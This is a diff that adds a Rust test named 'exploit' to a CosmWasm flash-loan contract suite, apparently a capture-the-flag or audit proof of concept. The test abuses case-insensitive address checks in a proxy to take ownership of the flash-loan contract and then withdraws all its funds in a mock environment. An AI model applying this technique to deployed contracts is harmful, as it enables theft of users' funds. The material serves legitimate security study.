@@ -159,4 +159,50 @@ pub mod tests {
             .unwrap();
         assert_eq!(balance.amount, Uint128::new(10_000));
     }
+    
+    #[test]
+    fn exploit() {
+        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
+            proper_instantiate();
+
+        // prepare transfer ownership message
+        let pwn_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
+            new_owner: Addr::unchecked(CONTRACT2),
+        })
+        .unwrap();
+
+        // evade the minimal sanity checking in proxy.rs
+        // (cosmos addresses aren't case-sensitive)
+        let wat: &str = r#"CONTRACT0"#;
+
+        // direct control flow to flashloan contract instead of arb contract
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            proxy_contract,
+            &ExecuteMsg::RequestFlashLoan {
+                recipient: Addr::unchecked(wat),
+                msg: pwn_msg,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // drain funds
+        app.execute_contract(
+            Addr::unchecked(CONTRACT2),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::WithdrawFunds {
+                recipient: Addr::unchecked(CONTRACT2),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // funds are sent back to flash loan contract
+        let balance = app
+            .wrap()
+            .query_balance(CONTRACT2, DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(10_000));
+    }
 }
